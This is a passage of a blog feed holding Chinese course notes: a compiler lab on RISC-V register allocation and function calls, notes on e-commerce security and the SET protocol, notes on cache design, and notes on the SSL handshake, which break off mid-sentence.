class="token punctuation">.</span>printInstr<span class="token punctuation">(</span>Riscv<span class="token punctuation">.</span>NativeStoreWord<span class="token punctuation">(</span>Riscv<span class="token punctuation">.</span>RA<span class="token punctuation">,</span> Riscv<span class="token punctuation">.</span>SP<span class="token punctuation">,</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token builtin">len</span><span class="token punctuation">(</span>Riscv<span class="token punctuation">.</span>CalleeSaved<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>printer<span class="token punctuation">.</span>printInstr<span class="token punctuation">(</span>Riscv<span class="token punctuation">.</span>NativeStoreWord<span class="token punctuation">(</span>Riscv<span class="token punctuation">.</span>FP<span class="token punctuation">,</span> Riscv<span class="token punctuation">.</span>SP<span class="token punctuation">,</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token builtin">len</span><span class="token punctuation">(</span>Riscv<span class="token punctuation">.</span>CalleeSaved<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>printer<span class="token punctuation">.</span>printInstr<span class="token punctuation">(</span>Riscv<span class="token punctuation">.</span>FPAdd<span class="token punctuation">(</span>self<span class="token punctuation">.</span>nextLocalOffset<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token comment"># load RA, FP and CalleeSaved regs here</span>    self<span class="token punctuation">.</span>printer<span class="token punctuation">.</span>printInstr<span class="token punctuation">(</span>Riscv<span class="token punctuation">.</span>NativeLoadWord<span class="token punctuation">(</span>Riscv<span class="token punctuation">.</span>RA<span class="token punctuation">,</span> Riscv<span class="token punctuation">.</span>SP<span class="token punctuation">,</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token builtin">len</span><span class="token punctuation">(</span>Riscv<span class="token punctuation">.</span>CalleeSaved<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>printer<span class="token punctuation">.</span>printInstr<span class="token punctuation">(</span>Riscv<span class="token punctuation">.</span>NativeLoadWord<span class="token punctuation">(</span>Riscv<span class="token punctuation">.</span>FP<span class="token punctuation">,</span> Riscv<span class="token punctuation">.</span>SP<span class="token punctuation">,</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token builtin">len</span><span class="token punctuation">(</span>Riscv<span class="token punctuation">.</span>CalleeSaved<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>printer<span class="token punctuation">.</span>printInstr<span class="token punctuation">(</span>Riscv<span class="token punctuation">.</span>SPAdd<span class="token punctuation">(</span>self<span class="token punctuation">.</span>nextLocalOffset<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 <code>backend/reg/bruteregalloc.py</code> 中, 使用 <code>self.numArgs</code> 记录函数自身的参数数量, 使用 <code>self.functionParams</code> 记录子函数所使用的参数对应的虚拟寄存器, 使用 <code>self.callerSavedRegs</code> 保存 <code>caller_saved</code> 寄存器. 在函数开始先将实参绑定到寄存器中, 然后分析语句.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># backend/reg/bruteregalloc.py</span><span class="token keyword">def</span> <span class="token function">accept</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> graph<span class="token punctuation">:</span> CFG<span class="token punctuation">,</span> info<span class="token punctuation">:</span> SubroutineInfo<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>numArgs <span class="token operator">=</span> info<span class="token punctuation">.</span>numArgs    self<span class="token punctuation">.</span>functionParams <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    self<span class="token punctuation">.</span>callerSavedRegs <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>allocForLoc</code> 为每行指令分配寄存器时, 若为 <code>Param</code> 类型, 累计参数小于 8 时直接分配参数寄存器; 若为 <code>Call</code> 类型, 先保存 <code>caller_saved</code> 寄存器, 将多余参数插入栈中, 调用后恢复除 <code>A0</code> 外的所有 <code>caller_saved</code> 寄存器, 否则返回值会被覆盖. 同样需要注意的是, 为虚拟寄存器分配实际寄存器时, 需要特殊判断虚拟寄存器是否对应存储在栈上的函数参数:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># backend/reg/bruteregalloc.py</span><span class="token keyword">def</span> <span class="token function">allocRegFor</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> temp<span class="token punctuation">:</span> Temp<span class="token punctuation">,</span> isRead<span class="token punctuation">:</span> <span class="token builtin">bool</span><span class="token punctuation">,</span> live<span class="token punctuation">:</span> <span class="token builtin">set</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">,</span> subEmitter<span class="token punctuation">:</span> SubroutineEmitter<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token keyword">if</span> isRead<span class="token punctuation">:</span>        <span class="token comment"># 如果是存储在栈上的参数, 利用 FP 从栈中加载</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>maxNumParams <span class="token operator">&lt;=</span> temp<span class="token punctuation">.</span>index <span class="token operator">&lt;</span> self<span class="token punctuation">.</span>numArgs<span class="token punctuation">)</span><span class="token punctuation">:</span>            subEmitter<span class="token punctuation">.</span>emitLoadParamFromStack<span class="token punctuation">(</span>reg<span class="token punctuation">,</span> temp<span class="token punctuation">.</span>index<span class="token punctuation">)</span>        <span class="token comment"># 否则, 利用 SP 从栈中加载</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            subEmitter<span class="token punctuation">.</span>emitLoadFromStack<span class="token punctuation">(</span>reg<span class="token punctuation">,</span> temp<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h2><h3 id="step-9-1"><a href="#step-9-1" class="headerlink" title="step 9"></a>step 9</h3><ol><li><p>你更倾向采纳哪一种中间表示中的函数调用指令的设计 (一整条函数调用 vs 传参和调用分离)? 写一些你认为两种设计方案各自的优劣之处.</p><p> <strong>答:</strong> 我更倾向采纳传参和调用分离, 这与实验文档给出的参考中间风格一致, 更接近目标语言.</p><p> <strong>一整条函数调用</strong>:</p><ul><li><strong>优势</strong>:<ul><li>调用过程封装在一个指令中, 语义清晰, 可读性好.</li><li>更接近高级语言, 有助于保留源代码结构和语义.</li></ul></li><li><p><strong>劣势</strong>:</p><ul><li>整条函数调用指令可能不够精确, 再特定架构下不能满足精细控制的需求.</li></ul><p><strong>传参和调用分离</strong>:</p></li><li><p><strong>优势</strong>:</p><ul><li>与实验文档给出的参考中间风格一致, 更接近目标语言.</li></ul></li><li><strong>劣势</strong>:<ul><li>需要增加 <code>Param</code> 指令描述参数传递, 提高了实现难度.</li><li>中间表示可读性略差.</li></ul></li></ul></li><li><p>为何 RISC-V 标准调用约定中要引入 <code>callee-saved</code> 和 <code>caller-saved</code> 两类寄存器, 而不是要求所有寄存器完全由 <code>caller/callee</code> 中的一方保存? 为何保存返回地址的 <code>ra</code> 寄存器是 <code>caller-saved</code> 寄存器?</p><p> <strong>答:</strong> 如果寄存器都由 <code>caller</code> 保存, <code>callee</code> 可能只使用很少几个, 恢复寄存器开销过大; 如果寄存器都由 <code>callee</code> 保存, 函数调用结束时恢复所有用到的寄存器开销过大. 引入 <code>callee-saved</code> 和 <code>caller-saved</code> 两类寄存器, 编译器可以让 <code>callee</code> 保存函数调用后依然有效的值 (如返回地址), 让 <code>caller</code> 保存函数调用过程后不再使用的值 (如函数参数).</p><p> 调用函数时, <code>ra</code> 中当前返回地址会被调用函数的返回地址替代, 因此需要在进入函数前保存好 <code>ra</code> 的值, 这应当由 <code>caller</code> 来完成.</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> Compiler </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Principles of Compiler </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络安全技术 笔记7</title>
      <link href="/2023/12/13/ji-suan-ji-wang-luo-an-quan-ji-zhu-bi-ji-7/"/>
      <url>/2023/12/13/ji-suan-ji-wang-luo-an-quan-ji-zhu-bi-ji-7/</url>
      
        <content type="html"><![CDATA[<h1 id="七、电子商务与-SET-协议"><a href="#七、电子商务与-SET-协议" class="headerlink" title="七、电子商务与 SET 协议"></a>七、电子商务与 SET 协议</h1><h2 id="电子商务安全"><a href="#电子商务安全" class="headerlink" title="电子商务安全"></a>电子商务安全</h2><ul><li>电子商务安全要求:<ul><li>数据传输的安全性:<ul><li>保证在公网上传送的资金帐号、客户密码、支付金额等网络支付信息数据不被第三方窃取.</li><li>采用对称加密实现, 数字信封利用非对称加密实现.</li></ul></li><li>数据的完整性:<ul><li>数据在传输过程中不被篡改.</li><li>通过安全的散列函数和数字签名实现, 双重数字签名保证多方通信时数据的完整性.</li></ul></li><li>身份验证:<ul><li>交换敏感信息时确认对方真实身份, 支付时确认账户信息真实有效.</li><li>采用口令技术, 非对称密码, 数字签名, 数字证书等技术实现.</li></ul></li><li>交易的不可抵赖:<ul><li>各方在进行数据传输时, 带有自身特有无法复制的信息, 交易双方在支付过程中都无法抵赖, 保证发生纠纷时有所对证.</li><li>通过时间戳, 数字签名, 数字证书等技术实现.</li></ul></li></ul></li><li>电子商务安全包括:<ul><li>基本加密算法.</li><li>以基本加密算法为基础的证书认证体系 CA, 及数字信封、数字签名等基本安全技术.</li><li>以基本加密算法、安全技术、CA 体系为基础的安全应用协议.</li></ul></li><li>CA 认证体系:<ul><li>以基本加密算法为基础, 采用基本安全技术.</li><li>为上层安全应用协议提供证书认证.</li><li>CA 证书标准:<ul><li>各国自行开发并拥有版权的认证体系.</li><li>为用户发放 CA 证书, 包括 SSL 证书.</li><li>CA 证书以 X.509 为基础, 进行扩展, 兼容多种协议证书.</li></ul></li><li>SET CA:<ul><li>符合 SET 标准.</li><li>专为基于银行支付卡的电子商务服务提供者及用户发放 SET 证书.</li></ul></li></ul></li><li>电子商务安全体系:<ul><li>网络系统安全: 针对物理技术系统.<ul><li>保证网络设施的正常运行.</li><li>避免受到外界的恶意攻击.</li></ul></li><li>网络信息安全: 针对商务逻辑系统.<ul><li>信息保密、信息完整.</li><li>身份认证、不可抵赖.</li><li>信息有效.</li></ul></li><li>网络交易安全:<ul><li>参与对象之间交易过程.</li><li>如 SSL, SET, 公钥基础设施 PKI.</li></ul></li></ul></li></ul><h2 id="安全电子交易协议-SET"><a href="#安全电子交易协议-SET" class="headerlink" title="安全电子交易协议 SET"></a>安全电子交易协议 SET</h2><ul><li><p>SET 简介:</p><ul><li>应用于互联网环境, 以信用卡为基础的安全电子交付协议.</li><li>不用信用卡支付的交易方式与 SET 无关.</li><li>给出了电子交易的过程规范.</li><li>实现电子商务交易中的加密、认证、密钥管理机制.</li></ul></li><li><p>SET 目标:</p><ul><li>保密性:<ul><li>防止数据被黑客或被内部人员窃取.</li></ul></li><li>真实性:<ul><li>多方认证问题:<ul><li>对消费者信用卡认证.<ul><li>商家能够验证卡用户是有效卡账号的合法用户.</li></ul></li><li>对网上商店认证.<ul><li>卡用户可以验证商家可以接受支付信用卡.</li></ul></li><li>消费者、商店与银行间的认证.</li></ul></li></ul></li><li>隐私性:<ul><li>保证订单信息和个人账号信息的隔离:<ul><li>客户资料通过商家到达银行, 但商家不能看到客户帐号信息.</li><li>银行不能看到用户订单信息.</li></ul></li></ul></li><li>实时性:<ul><li>网上交易的实时性, 所有支付过程都是在线.</li></ul></li></ul></li><li><p>SET 参与方:</p><ul><li>发卡银行 (issuer):<ul><li>发放信用卡, 交易中处理电子货币的审核和支付.</li><li>交易开始前, 查验持卡人的数据有效, 交易才能成立.</li></ul></li><li>持卡人 (cardholder):<ul><li>包括个人和团体消费者.</li><li>填写网上商店表单, 通过发卡银行的信用卡付费.</li></ul></li><li>网上商家 (merchant):<ul><li>网上符合 SET 规格的电子商店, 提供商品或服务.</li><li>具备相应电子货币使用条件, 从事商业交易的公司组织.</li><li>通常向用户提供 Web 界面, 和收款行建立信任关系.</li></ul></li><li>支付网关 (payment gateway):<ul><li>由银行操作, 将互联网传输数据转为金融机构内部数据.</li><li>或由指派第三方处理商家支付信息和顾客支付指令.</li><li>将 SET 和现有银行卡支付的网络系统作为接口.</li></ul></li><li>收款行 (acquirer):<ul><li>收款行为商家建立账号, 处理每笔交易的支付授权和实际支付.</li><li>代替商家与多个发卡行联系, 验证持卡人信用卡信息的有效性.</li></ul></li><li><p>证书授权 (CA):</p><ul><li>可信赖的公正组织.</li><li>接受持卡人、商店、银行及支付网关的数字认证申请, 签发管理数字证书, 使持卡人、商家和支付网关可通过数字证书进行认证.</li></ul><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301710233.png" alt=""></p></li></ul></li><li><p>SET 交易过程:</p><ul><li><p>交易前完成认证:</p><ul><li>持卡人证书:<ul><li>持卡人的发卡机构向持卡人发放证书.</li><li>持卡人向支付网关提供帐号信息和秘密值用于验证.</li><li>持卡人证书连同购买请求和加密支付指令传给商家, 商家在最低程度上验证该帐号.</li></ul></li><li>商家证书:<ul><li>网上商家获得证书认证, 表明接受某个银行的支付卡.</li></ul></li><li>支付网关证书:<ul><li>持卡人从支付网关证书获取密钥, 加密账号信息.</li><li>只有支付网关能看到持卡人账号信息.</li></ul></li><li>收款行证书/发卡行证书:<ul><li>收款行/发卡行通过证书, 接收并处理商家证书请求.</li></ul></li></ul></li><li><p>网上支付处理过程——购买请求:</p><ul><li><p>发起请求报文:</p><ul><li>持卡人向商家发送信用卡品牌, ID. </li></ul></li><li><p>发起响应报文:</p><ul><li>商家向持卡人发送用商户私钥签名, Transiaction ID, 证书. </li></ul></li><li><p>持卡人验证商家证书, 生成 PI 和 OI, 将 Transiaction ID 放入.</p></li><li><p>PI 和 OI 必须分开加密和签名, 保证用户隐私不被泄漏.</p></li><li><p>PI 和 OI 必须有联系, 防止商家篡改信息产生纠纷.</p></li><li><p>购买请求报文:</p><ul><li>持卡人向商家发送 PI 和 OI.</li></ul></li><li><p>双签名:</p><ul><li>连接两个发送给不同接收者的报文.</li><li><p>KRc 为顾客私有签名密钥.</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301710234.png" alt=""></p></li></ul></li><li><p>客户生成购买请求:</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301710235.png" alt=""></p></li><li><p>商家验证用户的订单:</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301710236.png" alt=""></p></li></ul></li><li><p>网上支付处理过程——支付授权:</p><ul><li>商家通过支付网关、发卡行得到授权, 才能发货.</li><li>授权请求报文:<ul><li>与购买有关的信息: PI, 双签名.</li><li>与授权有关的信息: Es.</li><li>证书: 客户, 商家.</li></ul></li><li>授权响应报文:<ul><li>与授权有关的信息.</li><li>证书.</li></ul></li><li>支付网关处理授权请求:<ul><li>验证证书合法性.</li><li>解密数字信封, 获得会话密钥.</li><li>验证商家数字签名.</li><li>解密支付信息.</li><li>验证双签名.</li><li>验证 Transiaction ID 与 PI 一致.</li><li>从发卡行申请支付.</li></ul></li><li>商家获得授权后, 向用户确认商品清单.</li></ul></li><li><p>网上支付处理过程——支付获取:</p><ul><li>商家向发卡行申请支付.</li><li>商家通过支付获取, 才能完成银行转帐业务.</li><li>获取请求报文:<ul><li>支付的数量, 交易 ID, 获取权标, 商人签名密钥, 证书.</li></ul></li><li>获取响应报文:<ul><li>网关签名, 加密获取相应数据块, 网关签名密钥证书.</li></ul></li></ul></li></ul></li><li><p>SSL 与 SET 的比较:</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301710237.png" alt=""></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> Network Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Network Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理 笔记8</title>
      <link href="/2023/12/11/ji-suan-ji-zu-cheng-yuan-li-bi-ji-8/"/>
      <url>/2023/12/11/ji-suan-ji-zu-cheng-yuan-li-bi-ji-8/</url>
      
        <content type="html"><![CDATA[<h1 id="Cache"><a href="#Cache" class="headerlink" title="Cache"></a>Cache</h1><h2 id="SRAM"><a href="#SRAM" class="headerlink" title="SRAM"></a>SRAM</h2><ul><li>无需刷新: 持续供电即可保持稳态; 掉电数据丢失: 无持久性.</li><li>存储密度低: DRAM 使用 1 个晶体管, SRAM 使用 6 个晶体管.</li></ul><h2 id="Cache-1"><a href="#Cache-1" class="headerlink" title="Cache"></a>Cache</h2><ul><li>目的: 根据程序局部性, 加快程序执行.</li><li>包含信息:<ul><li>地址.</li><li>数据.</li><li>Valid 位.</li></ul></li><li>设计原则:<ul><li>内存物理地址到 Cache 地址的地址映射关系.</li><li>Cache 使用虚拟地址 or 物理地址.<ul><li>CPU 提供虚拟地址, Cache 虚拟地址无需让 MMU 进行 Page Table Walker, 加速查询.</li><li>两个 Cache 虚拟地址对应同一物理地址, 一致性有误.</li><li>一个 Cache 虚拟地址对应两个物理地址, Cache 只能保存一项.</li><li>薛定谔的地址?</li></ul></li><li>控制位.</li><li>数据粒度.</li></ul></li><li><p>Cache Line:</p><ul><li>大小至少 4Byte, 使用一个 Valid 位控制.</li><li>若 Cache Line 过大, 可针对每 4Byte 或 8Byte 再设 Valid 位.</li></ul></li><li><p>不允许 Cache 的内存地址: MMIO 外设, 如串口寄存器, 读写慢. 需要将内存地址分类为 Cached/Uncached.</p></li><li>Cache 分类:<ul><li>L1 Cache: 多核 private, 分 Icache 与 Dcache. </li><li>L2 Cache: 多核 private.</li><li>L3 Cache: 多核 public.</li></ul></li><li><p>内存物理地址到 Cache 地址的映射关系:</p><ul><li>地址只允许被映射到一个位置.</li><li>地址允许被映射到多个位置.</li><li><p>全相联映射: 任何地址允许被映射到任何 Cache 的任何位置.</p><ul><li>Cache Line 大小为 4Byte: 地址前 30 位为 CT, 后 2 位为 CO.</li><li><p>条件:</p><ul><li>Valid 位为 1.</li><li>CT 相同.</li></ul></li><li><p>利用率高; 1024 路比较电路成本大, 硬件复杂, 延迟增加.</p></li><li>需要缓存替换算法.</li></ul></li><li><p>直接映射: 主存按 Cache 大小分块, 地址对应映射.</p><ul><li>Cache 大小为 4KB: 地址前 20 位为 CT, 中 10 位为 CI, 后 2 位为 CO.</li><li><p>条件:</p><ul><li>CI 索引 Cache Line 位置.</li><li>Valid 位为 1.</li><li>CT 相同.</li></ul></li><li><p>单路比较电路, 硬件简单; 利用率低.</p></li><li>无需缓存替换算法.</li></ul></li><li><p>组相联映射: 结合全相联映射与直接映射, 相当于多路直接映射.</p></li></ul></li><li>Cache 写策略:<ul><li>Write back (绝大多数):<ul><li>写分配:<ul><li>先替换, 替换时 Dirty 写回主存, 替换后再写 Cache.</li><li>程序 load/store 仅对 Cache 进行, 程序视角满足一致性.</li></ul></li></ul></li><li>Write through (MMIO 内存 or 多核 CPU 的 TLB 更新):<ul><li>写分配:<ul><li>先替换, 替换后先写 Cache, 再写主存.</li></ul></li><li>非写分配:<ul><li>直接写主存.</li></ul></li></ul></li></ul></li><li><p>Cache 缺失:</p><ul><li>必然缺失: 进程切换/首次访问.</li><li>容量缺失: 全相联映射.</li><li>冲突缺失: 直接映射/组相联映射.</li><li>无效缺失: 其他进程修改.</li></ul></li><li><p>Cache 替换策略:</p><ul><li>RAND.</li><li>FIFO.</li><li>LRU.</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> Organization &amp; Design </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Organization &amp; Design </tag>
            
            <tag> SV </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络安全技术 笔记6</title>
      <link href="/2023/11/29/ji-suan-ji-wang-luo-an-quan-ji-zhu-bi-ji-6/"/>
      <url>/2023/11/29/ji-suan-ji-wang-luo-an-quan-ji-zhu-bi-ji-6/</url>
      
        <content type="html"><![CDATA[<h1 id="六、SSL-及-HTTPS"><a href="#六、SSL-及-HTTPS" class="headerlink" title="六、SSL 及 HTTPS"></a>六、SSL 及 HTTPS</h1><h2 id="传输层安全协议-SSL"><a href="#传输层安全协议-SSL" class="headerlink" title="传输层安全协议 SSL"></a>传输层安全协议 SSL</h2><h3 id="传输层安全协议概述"><a href="#传输层安全协议概述" class="headerlink" title="传输层安全协议概述"></a>传输层安全协议概述</h3><ul><li>网络层安全协议:<ul><li>提供端到端的网络层安全传输.</li><li>无法处理同一端系统中不同应用的安全需求.</li><li>需要在传输层和更高层提供网络安全传输服务.</li></ul></li><li>传输层安全服务:<ul><li>保证两个应用之间的保密性和安全性, 提供应用层安全服务.</li></ul></li><li>常用协议: SP4、TLSP、SSH、SSL.</li></ul><h3 id="SSL-协议概述"><a href="#SSL-协议概述" class="headerlink" title="SSL 协议概述"></a>SSL 协议概述</h3><ul><li>发展历程:<ul><li>保护基于 WEB 的通信.</li><li>服务器认证.</li><li>客户认证 (可选).</li><li>SSL 链路上的数据完整性和保密性.</li></ul></li><li>设计目标:<ul><li>工作在 TCP 协议上 (不支持 UDP), 保护正常运行于 TCP 上的任何应用层协议 (HTTP、FTP、SMTP、Telnet 能透明建立于 SSL 上).</li><li>在应用层协议传输前, SSL 协议完成客户端和服务器的身份认证、加密算法和密钥协商, 建立一条安全可信的通信信道.</li><li>应用层协议传送的数据会被加密, 在传输过程中不被修改, 是最安全的在线交易模式, 广泛用于互联网财务等敏感信息处理.</li></ul></li><li>安全保护:<ul><li>机密性保护:<ul><li>SSL 客户机和服务器传送数据经过了加密处理.</li></ul></li><li>完整性保护:<ul><li>利用消息认证技术保证信息完整性, 避免信息受到破坏.</li></ul></li><li>认证保护:<ul><li>利用证书和可信第三方认证, 客户机和服务器相互认证对方身份.</li><li>证书持有者在握手时交换数字证书, 验证证书保证对方身份合法性.</li></ul></li></ul></li><li>使用步骤:<ul><li>用户: 浏览器输入.</li><li>HTTP 层: 将用户需求翻译成 HTTP 请求.</li><li>SSL 层: 借助下层协议信道安全地协商加密密钥, 加密 HTTP 请求.</li><li>TCP 层: 与 Web Server 443 端口连接, 传递 SSL 处理后的数据.</li><li>SSL 在 TCP 上建立了加密通道, 通过这层的数据经过加密.</li></ul></li></ul><h3 id="SSL-体系结构"><a href="#SSL-体系结构" class="headerlink" title="SSL 体系结构"></a>SSL 体系结构</h3><ul><li>两个实体:<ul><li>客户机/服务器.</li><li>基于证书在客户机和服务器间完成身份认证.</li></ul></li><li>两个概念:<ul><li>会话 Session:<ul><li>客户端和服务器之间的一个关联, 即虚拟连接关系.</li><li>通过握手协议建立, 协商密码算法、主密钥等.</li><li>一个会话协商可由多个连接共享.</li></ul></li><li>连接 Connection:<ul><li>一个特定的通信信道, 常映射成一个 TCP 连接.</li><li>一般短暂, 如 HTTPS 一次访问可能需要多个连接, 共享同一会话协商的密码算法、主密钥.</li></ul></li></ul></li><li>SSL 协议:<ul><li>握手协议: 数据传输前进行身份认证, 协商算法、密钥、初始向量等.</li><li>记录协议: 定义传输格式, 为高层协议提供数据封装、压缩、加密基本功能, 安全通信.</li><li>告警协议.</li><li>修改密码规约协议.</li></ul></li></ul><h3 id="SSL-记录协议"><a href="#SSL-记录协议" class="headerlink" title="SSL 记录协议"></a>SSL 记录协议</h3><ul><li><p>安全服务:</p><ul><li>保密性:<ul><li>用握手协议定义的共享密钥, 用传统密钥算法加密 SSL 载荷.</li></ul></li><li>报文完整性:<ul><li>用握手协议定义的共享密钥计算报文认证码 MAC.</li></ul></li></ul></li><li><p>操作过程:</p><ul><li>分段.</li><li>压缩 (可选): 不能丢失信息.</li><li>增加 MAC: 使用共享密钥.</li><li>加密: 对称加密算法.</li><li>增加首部.</li></ul></li><li><p>形成 SSL 记录协议数据单元.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301710228.png" alt=""></p></li></ul><h3 id="SSL-握手协议"><a href="#SSL-握手协议" class="headerlink" title="SSL 握手协议"></a>SSL 握手协议</h3><ul><li><p>在传递应用数据之前使用.</p></li><li><p>安全服务: 认证、密钥和算法协商.</p><ul><li>握手协议允许 Client 和 Server 相互认证.<ul><li>Server 身份认证在 Client 身份认证之前.</li><li>Client 身份认证可选.</li></ul></li><li>协商加密算法和 MAC 算法.</li><li>协商主会话密钥 (Master Secret).</li><li>保护数据使用密钥通过 SSL 记录传送.</li></ul></li><li><p>消息类型: 10 种报文.</p></li><li><p>四个阶段:</p><ul><li><p>建立安全能力:</p><ul><li><p>client_hello/server_hello 报文: 包括 Version, Random, session id, cipher suite, compression method.</p></li><li><p>cipher suite: 包括</p><ul><li>密钥交换方法 (RSA, Diffie-Hellman, Fortezza).</li><li>加密算法 (RC4, RC2, DES, 3DES, IDEA, Fortezza).</li><li><p>MAC 算法 (MD5, SHA-1).</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301710229.png" alt=""></p></li></ul></li></ul></li><li><p>服务器认证和密钥交换:</p><ul><li><p>服务器发送 SSL 数字证书 Certificate.</p></li><li><p>(*) 如果服务器使用 SSL 3.0, 需要客户端提交数字证书, 发出 certificate_request 报文.</p></li><li><p>根据密钥交换算法:</p><ul><li>匿名 DH 算法, 不需要服务器发送证书, 但难防止中间人攻击.</li><li>DH 算法/RSA 算法, 发送 server_key_exchange, 交换密钥.</li></ul></li><li><p>服务器发送 sever_hello_done, 等待客户端响应.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301710230.png" alt=""></p></li></ul></li><li><p>客户认证和密钥交换:</p><ul><li><p>客户端验证服务器证书是否有效.</p></li><li><p>(*) 如果收到 certificate-request, 则发送 SSL 数字证书 Certificate, 同时发出签有客户端专用密钥的 certificate_verify, 服务器验证此消息签名, 可以验证客户端数字证书所有权; 否则发送 no_certificate alert, 服务器应用程序使会话失败.</p></li><li><p>客户端发送 client_key_exchange, 含 pre_master_secret 和消息认证码密钥, 后续阶段用来计算 master_secret.</p></li><li><p>主密钥 master_secret 不直接用于数据加密和认证, 而是产生连接所需的一系列密钥.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301710231.png" alt=""></p></li></ul></li><li><p>结束:</p><ul><li><p>客户端将 pre_master_secret 转为 master_secret, 派生所有密钥.</p></li><li><p>客户端发出 change_cipher_spec, 服务器转换为新协商密码对.</p></li><li><p>客户发送 finished, 验证密钥交换认证过程是否成功.</p></li><li><p>服务器发送 change_cipher_spec, 挂起状态迁移到当前 cipher_spec, 发送结束报文.</p></li><li><p>握手完成, 可以交换应用层数据.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301710232.png" alt=""></p></li></ul></li></ul></li></ul><h3 id="SSL-告警协议"><a href="#SSL-告警协议" class="headerlink" title="SSL 告警协议"></a>SSL 告警协议</h3><ul><li>功能:<ul><li>向对等实体传递 SSL 相关警报, 告警消息按当前状态压缩和加密.</li></ul></li><li>Level 字节:<ul><li>值 1 表示告警.</li><li>值 2 表示致命错误.<ul><li>SSL 立即中止连接.</li><li>会话中其它连接继续进行.</li><li>不会在此会话中建立新连接.</li></ul></li></ul></li></ul><h3 id="SSL-修改密码规约协议"><a href="#SSL-修改密码规约协议" class="headerlink" title="SSL 修改密码规约协议"></a>SSL 修改密码规约协议</h3><ul><li>功能:<ul><li>握手协议结束阶段发送, 通知接收方使用协商的密码算法和密钥.</li><li>接收方将会话的挂起状态复制到当前状态, 以后连接使用这些密码参数.</li></ul></li></ul><h3 id="SSL-安全性分析"><a href="#SSL-安全性分析" class="headerlink" title="SSL 安全性分析"></a>SSL 安全性分析</h3><ul><li>逻辑严密性, 完整性, 正确性:<ul><li>每次安全连接产生一个 128 位长的随机连接序号, 防范重放攻击.</li><li>几乎所有 Web 服务器及浏览器支持 SSL 协议, 开发成本小.</li></ul></li><li>保密性:<ul><li>SSL 协议的数据安全性建立在 RSA 等算法安全性上.</li></ul></li><li>认证性:<ul><li>SSL 对应用层不透明, 只能提供交易中客户与服务器的双方认证, 涉及多方电子交易中不能协调安全传输和信任关系.</li></ul></li></ul><h2 id="应用层安全协议-HTTPS"><a href="#应用层安全协议-HTTPS" class="headerlink" title="应用层安全协议 HTTPS"></a>应用层安全协议 HTTPS</h2><h3 id="WEB-及其安全威胁"><a href="#WEB-及其安全威胁" class="headerlink" title="WEB 及其安全威胁"></a>WEB 及其安全威胁</h3><ul><li>Web 技术:<ul><li>平台独立, 系统分布.</li><li>第一个网页服务器和 Web 浏览器——WWW.</li><li>基础技术:<ul><li>HTML: 编写文档的超文本标记语言.</li><li>HTTP: 发布资源的超文本传输协议.</li><li>URL: 通过互联网引用其他可访问文档或资源的统一资源定位.</li></ul></li><li>WWW 使人们进入了网络时代.</li><li>WWW 技术是运行在互联网和 